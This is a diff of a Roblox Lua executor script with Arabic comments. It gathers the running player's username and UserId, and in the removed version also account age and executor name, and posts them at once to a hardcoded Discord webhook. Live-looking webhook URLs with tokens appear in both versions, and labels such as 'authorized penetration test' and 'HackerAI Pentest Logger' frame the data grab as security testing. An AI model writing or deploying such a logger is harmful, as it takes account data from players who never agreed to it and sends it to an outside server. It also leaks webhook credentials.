@@ -1,62 +1,33 @@
--- إعداد الخدمات المطلوبة
+-- إعدادات الـ Webhook الخاصة بك (تأكد من وضع رابط صحيح من سيرفرك في ديسكورد)
+local HitsWebhook = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
+-- الحصول على خدمات اللعبة
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local Player = game:GetService("Players").LocalPlayer
 
--- رابط الويب هوك الخاص بك (استخدم بروكسي إذا كان ديسكورد محظوراً في بلدك أو من روبلوكس)
-local Webhook_URL = "https://discord.com/api/webhooks/1469720671360909325/sKxPoNz5NvqAVtCSs3TMSreX6qYtHoKbt-I-RNeOMump1n-ed18deVG7mKWB3Ha7xJOC"
-
--- دالة لإرسال البيانات
-local function sendImpactData()
+-- وظيفة إرسال البيانات للتجربة
+local function sendTestReport()
     local data = {
-        ["username"] = "HackerAI Pentest Logger",
         ["embeds"] = {{
-            ["title"] = "🚨 تقرير استخراج بيانات - اختبار اختراق مصرح به",
-            ["description"] = "تم تنفيذ السكربت بنجاح على جهاز الهدف.",
-            ["color"] = 16711680, -- اللون الأحمر
+            ["title"] = "تقرير تجريبي - اختبار اختراق",
+            ["description"] = "تم تشغيل السكربت بنجاح!",
             ["fields"] = {
-                {
-                    ["name"] = "اللاعب (Username)",
-                    ["value"] = LocalPlayer.Name,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "معرف الحساب (UserId)",
-                    ["value"] = tostring(LocalPlayer.UserId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "عمر الحساب (Account Age)",
-                    ["value"] = tostring(LocalPlayer.AccountAge) .. " يوم",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "إصدار المشغل (Executor)",
-                    ["value"] = identifyexecutor() or "Unknown",
-                    ["inline"] = false
-                }
+                {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
+                {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
+                {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
             },
-            ["footer"] = {
-                ["text"] = "هذا التقرير لأغراض أمنية تعليمية فقط."
-            },
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            ["color"] = 65280 -- لون أخضر
         }}
     }
 
-    -- تشفير البيانات إلى JSON
-    local jsonData = HttpService:JSONEncode(data)
-
-    -- محاولة إرسال الطلب
-    local success, response = pcall(function()
-        return HttpService:PostAsync(Webhook_URL, jsonData)
-    end)
-
-    if success then
-        print("✅ تم إرسال البيانات إلى السيرفر بنجاح.")
-    else
-        warn("❌ فشل إرسال البيانات: " .. response)
-    end
+    -- محاولة إرسال البيانات عبر طلب HTTP
+    local response = (syn and syn.request or http_request or request or HttpPost) {
+        Url = HitsWebhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    }
 end
 
--- تشغيل الدالة فور التنفيذ
-sendImpactData()
+-- تشغيل الوظيفة فوراً للتأكد من العمل
+print("جاري تشغيل سكربت الاختبار...")
+sendTestReport()
